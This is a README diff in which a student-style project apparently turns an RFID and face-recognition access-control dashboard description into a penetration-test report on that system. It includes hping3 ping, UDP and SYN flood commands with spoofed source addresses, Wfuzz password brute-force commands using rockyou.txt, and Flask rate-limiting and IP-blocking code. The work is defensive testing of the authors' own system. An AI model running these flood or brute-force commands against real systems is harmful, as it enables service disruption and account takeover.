@@ -12,118 +12,443 @@
 5. [HTTPS Implementation](#-https-web-interface-and-certificate-generation)
 6. [Authors](#authors)
 
-## 📍 Appointment
+## 🛡️ A brief description of the ACS security testing project
 
-To monitor events related to the entrance or exit of users from the building, a web interface has been developed integrated with an access control and management system (ACS) using RFID identification and biometric authentication through facial recognition. This interface provides authorized employees with the ability to monitor user actions in real time, which is critical for ensuring security and access control in the organization's premises.
+The information security level of the access control and management system (ACS) with two-factor authentication has been tested.
+A specialized Kali Linux distribution was used for testing, which includes security audit and penetration testing tools.
+Testing objectives:
 
-The system operation process is as follows:
+1 Identification of vulnerabilities in the components of the ACS: the database web interface, the dashboard, and the backend;
 
-## 🔍 The authentication process:
+2 Assessment of resistance to typical cyber attacks.
 
-1 The user approaches the access point, where his RFID card is read using the RC522 RFID module connected to the Arduino.
+Conducted tests:
 
-2 If the RFID card is successfully read, the system starts additional biometric verification. The camera is used to recognize the employee's face using biometric authentication algorithms.
+1 DoS/DDoS attacks (Ping flood, UDP flood, SYN flood) using hping3 utility;
 
-3 If both stages of verification are successful, the system records the user's full name, the date and time of entry or exit, as well as the type of event (entry or exit).
+2 An HTTP/2 Rapid Reset attack aimed at overloading the server through the thread reset mechanism;
 
-### ☁️ Sending data to the server:
+3 Brute Force Attack on Login Forms Using Fuzz and Password Dictionary rockyou.txt .
 
-1 All data collected by the system (full name, event type, date and time) is sent to the server in real time using a method implemented in Python (for example, via Flask).
+## 🧰 The hardware and software used
 
-### 💻 Processing and display on the dashboard:
+The following hardware and software tools were used as part of the security testing project for the access control and management system (ACS):
 
-1 The server receives this data and transmits it to the web-based monitoring interface, which is automatically updated to display up-to-date data about users in the building.
+### 1. 🖥️ Hardware:
 
-2 The dashboard shows a list of employees who have successfully authenticated and are in the building. The system also displays the type of event (input or output) and the time when the event occurred.
+- Arduino Uno is a microcontroller used to read RFID tags;
 
-3 For each entry, the user's full name, event type, and timestamp are displayed. Employees who have left the building are displayed as "not in the building", and information about them disappears from the panel as soon as they pass the exit check.
+- RFID module RC522 is a radio frequency identification module for reading MIFARE cards;
 
-### 🚶‍♂️ Operational tracking of movements:
+- USB camera — used for biometric authentication by facial recognition;
 
-1 Authorized employees or security systems can monitor in real time who is in the building and who has left it, which allows them to quickly respond to changes.
+- Server/PC running Windows 11 — to run the web interface, dashboard, and analysis;
 
-2 The dashboard can also include filtering, sorting, and searching functions by full name, entry/exit time, and event type. This simplifies data analysis, especially in the case of security checks or event analysis.
+- A local network is used to organize the interaction of ACS components and conduct network attacks.
 
-#### 📍 Thus, this system not only automates the access control process, but also significantly increases the level of security, allowing you to quickly track the movements of employees in the building, which is especially important for organizations where strict security measures must be observed or a large number of visitors must be managed.
+### 2. 🧑‍💻 Software (ACS):
 
-## 📊 Event displays
+- Flask (Python) is a web framework for creating a REST API, dashboard, and administration interface.;
 
-The dashboard displays events with data about the user's full name, time of the event, and type (entrance/exit), which allows you to effectively monitor the current situation in the building. All events are displayed in real time, updating automatically so that employees can immediately see information about who entered or left the building, as well as when it happened. Each event is accompanied by the following data:
+- MySQL — a database for storing information about users and access events;
 
-- User's full name: The full name of the authenticated employee or visitor.
+- Flask-Limiter — a module for limiting the frequency of requests (protection against DoS and brute force);
 
-- Date and time of the event: The exact time when the entrance or exit occurred, which allows you to accurately record the time intervals when users were in the building.
+- OpenCV and face_recognition are libraries for face recognition at the entrance;
 
-- Event type: An indication of whether this event was the entrance to the building (entrance) or exit from it (exit), which helps to distinguish between these two types of actions and allows for accurate monitoring.
+- FlaskWebGUI is a wrapper for running the interface as a desktop application;
 
-To increase the convenience of displaying information, it is structured and easily perceived. The following elements are provided in the interface:
+- A custom Python script implements IP address filtering, attacker blocking, and event logging.
 
-- Sorting and Filtering: Employees can sort events by time, event type, or user's full name. This allows you to quickly find information about a specific employee or timestamp.
+### 3. 🖥️ Testing Software (Kali Linux):
 
-- Automatic update: The dashboard is updated in real time, which allows you to always be aware of the current situation. New events are added to the table or list, and old events can be hidden when they are no longer relevant.
+- Kali Linux OS is a specialized distribution for conducting security audits and penetration testing;
 
-- Event History: All events are saved and can be viewed in a historical context. This is especially useful for subsequent analysis, reporting, or in the case of incident investigations.
+- hping3 is a network packet generation utility for implementing DoS attacks (Ping Flood, SYN Flood, UDP Flood);
 
-- Color coding: To enhance visibility, events can be highlighted in colors, for example, the entrance is green, the exit is red. This helps to quickly identify the type of event and allows you to quickly respond to changes.
+- Wfuzz is a tool for brute force attacks on web forms;
 
-[Sample Python code for updating data update_data.py file](update_data.py)
+- iptables is a configurable firewall in Linux (as an alternative to Windows Firewall).
 
-The data displayed on the dashboard is erased every 24 hours, an example of implementation:
+## 🔧 Additional Kali Linux Tools
 
-```
-def clear_events_every_24_hours():
-    while True:
-        time.sleep(86400)  
-        try:
-            with open(EVENTS_FILE, "w", encoding="utf-8") as f:
-                json.dump([], f, ensure_ascii=False, indent=4)
+Kali Linux includes more than 600 utilities covering all stages of penetration testing and security analysis. In addition to the tools already used in the project (hping3, Wfuzz, Nmap, etc.), the distribution package includes the following categories and utilities:
 
-        except (OSError, IOError):
-            pass
-```
-Example of event display:
+### 🛠️ 1. Vulnerability scanners
 
-![image](https://github.com/user-attachments/assets/4a6be65d-2f09-4e25-a8fb-e6c2bdeda11c)
+1 OpenVAS is a powerful system for comprehensive vulnerability analysis;
 
-Sample code for displaying events:
+2 Vulners and Searchsploit — databases of exploits and vulnerabilities;
 
-[To see all events you can use events.html file](events.html)
+3 Skipfish is a web application security scanner with support for automatic report generation.
 
-## 🔐 Authorization in the web interface
+### 🌐 2. Traffic Analysis Tools
 
-To increase security, access to the dashboard is limited by authorization. This data protection mechanism prevents unauthorized access, which is critical for the security of the entire system. The web interface uses a form to enter a username and password, while the entered data is checked on the server, and access is provided only to authorized users.
+1 Wireshark is a powerful network traffic sniffer and analyzer;
 
-![image](https://github.com/user-attachments/assets/e3d17a9a-e374-40ef-b42d-d4a410c4b2fa)
+2 tcpdump is a command—line tool for capturing network packets;
 
-Сode on Flask that implements a simple login form with login and password verification.
+3 Ettercap is a utility for Man-in-the-Middle (MITM) attacks.
 
-[Login form in login_form.py file](login_form.py)
+### 📂 3. Attacks on web applications
 
-## 🌐 HTTPS web interface and certificate generation
+1 OWASP ZAP (Zed Attack Proxy) is an alternative to Burp Suite, used to find vulnerabilities in web applications;
 
-To increase the security of interaction with the web interface of the access control system, the HTTPS protocol was configured, which provides data encryption between the server and the client. This prevented the possibility of intercepting confidential information such as usernames, passwords, and other data that could be transmitted while working with the system.
+2 sqlmap is an automatic tool for performing SQL injections and capturing data from a database.;
 
-A self-signed SSL/TLS certificate was used to implement HTTPS on the server. This certificate is created to establish a secure connection and ensures that the data between the user and the server is encrypted. If a self-signed certificate is used, the browser notifies the user that the certificate has not been verified by a third party, but in the context of local and test systems, this is a sufficient security measure.
+3 Commix is a tool for testing for the presence of command injections.
 
-To generate a self-signed certificate and a private key for use in Flask with HTTPS,  use the openssl utility:
+### 🛡️ 4. Password analysis tools
 
-```
-openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
-```
+1 Hydra is a utility for sorting passwords using various protocols (FTP, SSH, HTTP, etc.);
 
-After completing these steps, the received server.key (private key) and server.crt (certificate) files were used to configure HTTPS on the server.
+2 Medusa is an analog of Hydra with the possibility of mass search;
 
-![image](https://github.com/user-attachments/assets/7ee0fdce-e2a3-4258-b582-ffacaa146eab)
+3 Crunch — dictionary generator for brute force;
 
-This ensured the protection of all transmitted data, as well as increased user confidence in the system, ensuring that their data is protected during operation.
+4 CeWL is a dictionary generator based on web content (for example, a company website).
 
-Below is the code for launching the Flask server using a self-signed TLS certificate:
+### 🧠 5. Social engineering and phishing
 
-```
-if __name__ == '__main__':
-    context = ('cert.pem', 'key.pem')  
-    app.run(host='0.0.0.0', port=443, ssl_context=context)
-```
+1 Social Engineering Toolkit (SET) is a powerful framework for simulating phishing attacks, creating fake websites, etc.;
+
+2 BeEF (Browser Exploitation Framework) is a tool for attacking vulnerable browsers and extensions.
+
+### 🔒 6. Checking wireless networks
+
+1 Aircrack-ng — a set of tools for hacking WEP/WPA/WPA2 networks;
+
+2 Reaver — a tool for bruteforcing WPS PIN codes;
+
+3 Kismet is a system for detecting wireless networks and monitoring traffic.
+
+### 🏗️ 7. Frameworks and automation
+
+1 The Metasploit Framework is one of the most popular frameworks for vulnerability development and exploitation.;
+
+2 ExploitDB + msfconsole is an exploit database with the ability to run automatically through the Metasploit console;
+
+3 Armitage is a GUI shell for Metasploit that simplifies attacks.
+
+These tools make Kali Linux a universal platform for testing information security systems, including ACS, web applications, databases, local and wireless networks.
+
+## 🛡️ Denial of Service Testing (DoS/DDoS)
+
+Denial of service testing using various types of DoS and DDoS attacks was conducted to assess the stability of the access control and management system (ACS), as well as related components (dashboards and the database web interface).
+
+### 📶 Attacks used in testing
+
+#### Ping Flood 
+
+Is an attack in which an attacker sends a large number of ICMP Echo requests (ping) to the target host, depleting its resources for processing responses.
+
+#### UDP Flood 
+
+Numerous UDP packets are generated on random ports of the target machine. In response, the system is forced to send ICMP packets "port unavailable", which puts strain on the network and resources.
+
+#### SYN Flood 
+
+Is an attack at the stage of establishing a TCP connection. The attacker initiates many connections without completing them, as a result of which the target server spends resources "waiting" for the connections to complete.
+
+### 🔧 Using the hping3 tool
+
+The hping3 tool included in Kali Linux was used to simulate the above attacks. It allows you to flexibly generate arbitrary packets and control various network communication parameters (protocol type, TCP flags, frequency of sending, etc.).
+
+The commands to launch the attacks looked like this:
+
+#### Ping Flood:
+
+````
+hping3 -1 -d 120 -s 12345 -p 80 --flood <target IP address>
+hping3 -1 -c 1000 --faster <target IP address> -V
+hping3 -1 --flood <target IP address>
+hping3 -1 --flood -a 1.2.3.4 <target IP address>
+````
+
+-1 - using the ICMP protocol (ping).
+
+--flood - sending packages as quickly as possible, without waiting for responses
+
+-d 120 - the size of the data in the packet (120 bytes).
+
+--fast - fast mode (but not maximum, like --flood).
+
+--count 100 - send 100 packages.
+
+-a 1.2.3.4 is the fake (spoofed) IP address of the sender.
+
+![image](https://github.com/user-attachments/assets/9131180b-f4c7-4652-8fa2-2e257653bcbd)
+
+#### UDP Flood:
+
+````
+hping3 --udp -p 80 --flood <target IP address>
+hping3 -2 -c 1000 --faster -p 1000 <target IP address> -V
+hping3 --udp --flood -a 1.2.3.4 <<target IP address>
+````
+
+--udp - using the UDP protocol.
+
+-- 2 - using the UDP protocol.
+
+--flood - sending packages as fast as possible.
+
+-p 1000 - indicates the destination port.
+
+-d 120 is the size of the data in the UDP packet.
+
+-a 1.2.3.4 - spoofing of the sender's IP address.
+
+![image](https://github.com/user-attachments/assets/27f1fc4f-589f-4200-9c97-93ca4b85ce35)
+
+#### SYN Flood:
+
+````
+hping3 --syn -p 80 --flood <target IP address>
+hping3 --syn -c 1000 --faster -p 3000 <target IP address>
+hping3 --syn -p 80 -a 1.2.3.4 --flood <target IP address>
+````
+
+--syn - sending TCP packets with the SYN flag.
+
+--flood - the maximum sending speed.
+
+-p 3000 is the destination port.
+
+-c 10000 is the number of packets to send.
+
+-a 1.2.3.4 - substitution of the source IP address.
+
+![image](https://github.com/user-attachments/assets/33e9c75c-b6bb-49e1-80b4-04ca185e1601)
+
+### Test results
+
+In all cases, when launching attacks, it was not possible to disrupt the performance of the ACS and its components. All incoming malicious packets were successfully rejected during the network interaction stage. This is confirmed by the absence of failures in the web interface and dashboard, as well as logging logs.
+
+The main reason for the failure of the attacks was the pre-configured security policy of the built-in Windows firewall, which blocks all incoming traffic that does not comply with the allowed rules. Similar protection can be implemented in Linux systems using iptables.
+Conclusions on sustainability
+
+The DoS/DDoS attacks carried out have shown the high resistance of ACS to external network influences. Pre-configuring the firewall allows you to effectively filter malicious traffic.
+
+Additionally, if the system is deployed in a production environment, it is recommended to use dedicated network equipment, such as pfSense, for more flexible and centralized traffic filtering.
+
+## 🚨 HTTP/2 Rapid Reset attack
+
+### 🔍 The principle of operation
+
+The HTTP/2 Rapid Reset attack uses the specifics of the HTTP/2 protocol, in which a client can establish multiple parallel streams within a single connection. The attacker opens a large number of such streams and immediately dumps them using the RST_STREAM frame. This leads to an excessive load on the server, as it is forced to allocate resources to process each of these requests, despite their instant reset.
+
+As a result, the server spends significant computing and network resources on managing a multitude of incomplete threads, which reduces its performance and can lead to denial of service (DoS) attacks.
+
+⚙️ Implementation of the attack
+
+Specialized tools or custom scripts were used to carry out the attack, which:
+
+1 Establish multiple parallel HTTP/2 connections to the server.
+
+2 Streams are quickly initiated on each connection.
+
+3 RST_STREAM frames are immediately sent to reset each stream.
+
+4 Repeat this process with high frequency, creating a constant load.
+
+In our testing, these requests were sent from a single IP address, which allowed us to identify the possibility of blocking an attacker based on traffic analysis.
+
+### 🛡️ Results and protection
+
+During the attack, the server began to experience increased load, which was recorded by monitoring. As a result of the automatic analysis of the frequency of requests, an abnormally high level of activity was detected from a specific IP address.
+
+To protect against this attack, a Python script was implemented that:
+
+- Monitors the number of HTTP/2 requests from each IP address.
+
+- If more than 5 requests are received from one IP address in one second, the IP address is automatically added to the block list.
+
+- The blocked IP cannot access the system for one hour.
+
+- After the blocking time expires, the IP is removed from the list and gets the opportunity to connect again.
+
+````
+limiter = Limiter( 
+    get_remote_address,
+    app=app,
+    default_limits=["5 per second"]
+)
+
+blocked_users = {} 
+
+def check_blocked_user(ip):
+    if ip in blocked_users:
+        block_time = blocked_users[ip]
+        if time.time() - block_time > 3600:
+            del blocked_users[ip]
+            return False
+        return True
+    return False
+
+def block_response():
+    return Response(
+        "<h1 style='color: red; font-size: 48px; text-align: center;'>Вы заблокированы</h1>",
+        status=403,
+        content_type='text/html; charset=utf-8'
+    )
+
+@app.before_request
+def before_request():
+    ip = get_remote_address() or request.remote_addr
+    if check_blocked_user(ip):
+        return block_response()
+
+@app.errorhandler(429)
+def ratelimit_error(e):
+    ip = get_remote_address() or request.remote_addr
+    if ip:
+        blocked_users[ip] = time.time()
+    return block_response()
+````
+This mechanism allowed:
+
+![image](https://github.com/user-attachments/assets/eed4d1b6-766a-4d12-bec4-4100abb123b2)
+
+![image](https://github.com/user-attachments/assets/7ab73194-4d6e-43f3-a530-9574455e1462)
+
+1 Block the attacker's IP address, excluding him from access to the system.
+
+2 Save access to the system for legitimate users from other IP addresses.
+
+3 To prevent further use of the HTTP/2 Rapid Reset attack for the duration of the block.
+
+This method provided a balance between protection and ease of use of the system, minimizing false alarms and keeping the ACS operational for honest users.
+
+## 🔐 Brute Force Password Brute Force
+
+### 🛠️ Attack using Fuzz and dictionary rockyou.txt
+
+To assess the vulnerability of ACS to password brute force attacks, the Wfuzz tool was used, a specialized fuzzer for the HTTP protocol that allows you to automatically insert password options from the dictionary into the authorization form.
+
+A popular file was used as a dictionary. rockyou.txt — a collection of real passwords obtained from hacked databases. To speed up testing, the dictionary has been reduced to 2,000 of the most common passwords.
+
+### 🎯 Example of the Wfuzz commands
+
+Example 1: Brute-forcing a password through a POST request with the password parameter
+
+````
+wfuzz -c -z file,rockyou_short.txt -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" http://target-url/login
+````
+
+Substitutes words from the file rockyou_short.txt in the password field.
+
+Example 2: Going through the password and login at the same time (double substitution)
+
+````
+wfuzz -c -z file,usernames.txt -z file,rockyou_short.txt -d "username=FUZZ1&password=FUZZ2" -H "Content-Type: application/x-www-form-urlencoded" http://target-url/login
+````
+
+Uses two dictionaries: one for logins (usernames.txt ), another for passwords (rockyou_short.txt ).
+
+Example 3: Password brute force in a GET request (for example, authentication via URL parameters)
+
+````
+wfuzz -c -z file,rockyou_short.txt http://target-url/login?username=admin&password=FUZZ
+````
+
+Example 4: Password brute force using session cookies
+
+````
+wfuzz -c -z file,rockyou_short.txt -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -b "sessionid=abcdef123456" http://target-url/login
+````
+
+The -b option adds a cookie to the request.
+
+Example 5: Brute-forcing a password with the User-Agent header
+
+````
+wfuzz -c -z file,rockyou_short.txt -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" http://target-url/login
+````
+
+Example 6: Displaying only successful attempts (for example, HTTP codes are not 403)
+
+````
+wfuzz -c -z file,rockyou_short.txt -d "username=admin&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" --hc 403 http://target-url/login
+````
+
+The --hc 403 (hide codes) parameter hides all responses with the 403 code so as not to clog the output.
+
+
+### 🚫 System response (code 403)
+
+![image](https://github.com/user-attachments/assets/c2b62c91-7dc8-4602-96bd-90ed1f07979f)
+
+![image](https://github.com/user-attachments/assets/f59d2a15-b7a8-4fd5-8c35-69be104be832)
+
+![image](https://github.com/user-attachments/assets/2c10245f-0ee1-4b91-97e1-5843c549df26)
+
+In all cases, the server returned the HTTP status code 403 Forbidden when the allowed number of authorization attempts was exceeded.
+
+This indicates the successful activation of protective mechanisms that:
+
+- They track the number of failed attempts from each IP.
+
+- They restrict further access by blocking the attacker's IP.
+
+### 🛡️ Protection mechanisms (IP blocking)
+
+The protection is implemented using a Python script integrated into the server application. The main functions of the code:
+
+- Maintaining a counter of requests from each IP.
+
+- If the limit is exceeded (for example, more than 5 failed attempts per second), the IP is added to the block list.
+
+- A blocked IP cannot send requests within the set time (usually 1 hour).
+
+- After the time expires, the lock is lifted.
+
+An example of a code snippet implementing IP blocking:
+
+````
+ALLOWED_IPS = {'127.0.0.1', '192.168.100.2', '192.168.100.147'}
+
+@app.before_request 
+def limit_remote_addr():
+    if request.remote_addr not in ALLOWED_IPS:
+        abort(403)
+````
+
+## ✅ General conclusions about the security of ACS
+
+During the comprehensive testing of the access control and management system (ACS), its main components were tested for resistance to common types of attacks, including DoS/DDoS, HTTP/2 Rapid Reset, and Brute Force attacks.
+
+The results showed that the system successfully blocks network overload attempts (DoS/DDoS), thanks to properly configured firewalls and built-in firewall rules. The mechanism for blocking IP addresses when suspicious activity is detected, for example, during an HTTP/2 Rapid Reset attack and frequent unsuccessful authorization attempts, has demonstrated high efficiency, preventing further attacks by intruders without impairing access for legitimate users.
+
+In addition, the web interface and dashboard are equipped with password brute force protection, which is confirmed by server responses with the 403 code during brute force attempts. The IP address filtering mechanism used limits attacks from unknown sources.
+
+The use of modern tools and technologies such as Kali Linux, hping3 and Wfuzz has made it possible to identify potential vulnerabilities and eliminate them in a timely manner, which increases the overall security level of the system.
+
+## 🔧 Recommendations for improving security
+
+To further enhance the security of the ACS, it is recommended to regularly update the software and signature databases for protection tools to take into account new threats and exploits.
+
+It is recommended to implement two-factor authentication (2FA) for access to administrative dashboards and critical system components. This will make unauthorized access much more difficult, even if the password is compromised.
+
+It is also important to implement centralized monitoring and notification of suspicious activity using SIEM systems (Security Information and Event Management), which will allow for rapid response to threats.
+
+To increase traffic control, you can deploy an additional firewall (for example, pfSense) with more flexible filtering rules.
+
+In addition to technical measures, it is recommended to conduct periodic training events and trainings for employees in order to minimize the risks associated with the human factor.
+
+Finally, it is worth regularly conducting automated and manual security testing (penetration testing) using the extended Kali Linux toolkit.
+
+## 🔍 Opportunities for future research
+
+In the field of future research, it is promising to consider the development and implementation of adaptive anomaly detection systems (IDS/IPS) capable of automatically responding to new types of attacks.
+
+It is also important to explore the possibilities of using machine learning to analyze network traffic and user behavior in order to prevent complex attacks.
+
+Research can be aimed at identifying vulnerabilities of new protocols and technologies used in ACS and developing methods to protect them.
+
+The integration of mobile solutions and biometric systems is promising to increase the convenience and security of access.
+
+In addition, it is worth paying attention to the research and implementation of cryptographic methods for protecting communication channels and user data.
 
 # Authors
 If you have any questions, you can ask them to us by writing to us at email:
